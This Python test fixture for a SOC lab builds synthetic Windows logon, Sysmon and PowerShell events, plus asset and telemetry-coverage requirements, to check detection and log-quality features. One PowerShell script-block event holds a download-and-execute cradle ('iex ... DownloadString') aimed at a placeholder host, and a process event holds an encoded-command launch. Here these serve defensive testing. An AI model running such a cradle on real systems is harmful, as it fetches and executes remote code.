"""Dữ liệu kiểm chứng tự dựng; không thu thập log máy, không phát traffic hoặc chạy payload."""

from contextlib import closing
from datetime import datetime, timezone
import json
from pathlib import Path

from soclab import live
from soclab.operations import canonical

AS_OF = '2026-10-09T03:00:00Z'


def build(root):
    root = Path(root)
    if root.exists(): raise ValueError('Fixture cần thư mục mới')
    root.mkdir(parents=True); inputs = root / 'inputs'; inputs.mkdir()
    workspace = root / 'workspace'; now = datetime.fromisoformat(AS_OF.replace('Z', '+00:00')).timestamp()
    def event(number, eid, channel, provider, age, data, host='FIN-WS-01'):
        return {'timestamp': datetime.fromtimestamp(now - age, timezone.utc).isoformat(), 'host': host, 'channel': channel,
                'provider': provider, 'event_id': eid, 'record_id': number, 'event_data': data,
                'provenance': {'kind': 'synthetic', 'scenario': 'service-readiness', 'note': 'Dữ liệu tự dựng, không phải log native hay incident thật'}}
    auth_data = {'TargetUserName': 'finance.ops', 'TargetDomainName': 'LAB', 'IpAddress': '192.0.2.50', 'LogonType': '3'}
    security = [event(10 + i, 4625, 'Security', 'Microsoft-Windows-Security-Auditing', 60 - i, {**auth_data, 'Status': '0xc000006d', 'SubStatus': '0xc000006a'}) for i in range(5)]
    security.append(event(15, 4624, 'Security', 'Microsoft-Windows-Security-Auditing', 50, auth_data))
    process = {'Image': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'CommandLine': 'powershell.exe -EncodedCommand aW5lcnQ=',
               'User': r'LAB\finance.ops', 'ProcessGuid': '{11111111-1111-4111-8111-111111111111}'}
    sysmon = [event(20, 1, 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-Sysmon', 20, process),
              event(21, 3, 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-Sysmon', 15,
                    {'SourceIp': '192.0.2.10', 'SourcePort': '51000', 'DestinationIp': '198.51.100.20', 'DestinationPort': '', 'Protocol': 'tcp', 'ProcessGuid': process['ProcessGuid']}),
              event(22, 1, 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-Sysmon', -300, {**process, 'ParentImage': 'explorer.exe'}),
              event(23, 1, 'Security', 'Microsoft-Windows-Sysmon', 10, process)]
    powershell = [event(30, 4104, 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', 7200,
                        {'ScriptBlockText': "'iex (New-Object Net.WebClient).DownloadString(inert.example)'", 'ScriptBlockId': 'constructed-block', 'MessageNumber': '1', 'MessageTotal': ''})]
    unmapped = [event(40, 1, 'System', 'EventLog', 10, {'Message': 'Inert unmanaged asset observation'}, host='WS-UNMAPPED')]
    batches = [('security', 'security-first', security[:5]), ('security', 'security-second', security[5:]),
               ('sysmon', 'sysmon', sysmon), ('powershell', 'powershell', powershell), ('unmapped', 'unmapped', unmapped)]
    for scope, name, events in batches:
        path = inputs / (name + '.jsonl'); path.write_text(''.join(json.dumps(e, ensure_ascii=False) + '\n' for e in events), encoding='utf-8', newline='\n')
        live.ingest_batch(workspace, path, scope=scope, kind='synthetic', now=now - 5)
    for scope in ('security', 'sysmon', 'powershell', 'unmapped'): live.run_detection(workspace, scope=scope, now=now)
    with closing(live.connect(workspace)) as conn, conn:
        # Simulated collector metadata is a fixture, never a claim of an actual collector outage.
        conn.execute('INSERT INTO collectors VALUES (?,?,?,?,?)', ('sysmon', canonical({'channel': 'Microsoft-Windows-Sysmon/Operational', 'record_id': 23}).decode(), now - 900, 1, 'constructed_channel_read_failed'))
        scopes = [{'id': s, 'source_sha256': [r[0] for r in conn.execute('SELECT sha256 FROM batches WHERE scope=? ORDER BY sha256', (s,))]} for s in ('security', 'sysmon', 'powershell', 'unmapped', 'backup-security')]
    assets = [{'id': 'finance', 'name': 'Máy trạm tài chính tự dựng', 'hosts': ['FIN-WS-01'], 'owner': 'Chủ dịch vụ tài chính trong scenario',
               'incident_lead': 'Đầu mối SOC trong scenario', 'business_service': 'Xử lý nghiệp vụ tài chính tự dựng', 'criticality': 'critical', 'data_classification': 'Không có dữ liệu nghiệp vụ thật'},
              {'id': 'backup', 'name': 'Máy backup khai báo chưa có log', 'hosts': ['BACKUP-01'], 'owner': 'Chủ dịch vụ backup trong scenario',
               'incident_lead': 'Đầu mối SOC trong scenario', 'business_service': 'Dịch vụ backup tự dựng', 'criticality': 'high', 'data_classification': 'Inventory giả định để kiểm chứng missing coverage'}]
    def requirement(identifier, asset, scope, channel, provider, ids, fields, heartbeat=None):
        return {'id': identifier, 'asset_id': asset, 'scopes': [scope], 'channel': channel, 'provider': provider, 'event_ids': ids,
                'required_fields': ['event_data.' + f for f in fields], 'expected_activity_seconds': 1800, 'max_ingest_lag_seconds': 120, 'max_collector_age_seconds': heartbeat}
    telemetry = [requirement('AUTH-COVERAGE', 'finance', 'security', 'Security', 'Microsoft-Windows-Security-Auditing', [4624, 4625], ['TargetUserName', 'TargetDomainName', 'IpAddress', 'LogonType']),
                 requirement('PROCESS-QUALITY', 'finance', 'sysmon', 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-Sysmon', [1], ['Image', 'CommandLine', 'ProcessGuid', 'ParentImage'], 300),
                 requirement('NETWORK-QUALITY', 'finance', 'sysmon', 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-Sysmon', [3], ['SourceIp', 'SourcePort', 'DestinationIp', 'DestinationPort', 'Protocol', 'ProcessGuid'], 300),
                 requirement('SCRIPT-COVERAGE', 'finance', 'powershell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', [4104], ['ScriptBlockText', 'ScriptBlockId', 'MessageNumber', 'MessageTotal']),
                 requirement('BACKUP-AUTH-COVERAGE', 'backup', 'backup-security', 'Security', 'Microsoft-Windows-Security-Auditing', [4624, 4625], ['TargetUserName', 'IpAddress'], 300)]
    profile = {'schema_version': 1, 'id': 'controlled-service-readiness', 'kind': 'synthetic', 'reviewed_by': 'Người tạo scenario kiểm chứng',
               'reviewed_at': '2026-10-09T00:00:00Z', 'valid_until': '2026-11-08T00:00:00Z',
               'collection_reason': 'Nguồn tự dựng cùng scenario để kiểm chứng chất lượng telemetry; không phải incident hay collector native.',
               'scopes': scopes, 'assets': assets, 'telemetry': telemetry}
    path = root / 'context.json'; path.write_text(json.dumps(profile, ensure_ascii=False, indent=2) + '\n', encoding='utf-8', newline='\n')
    return workspace, path
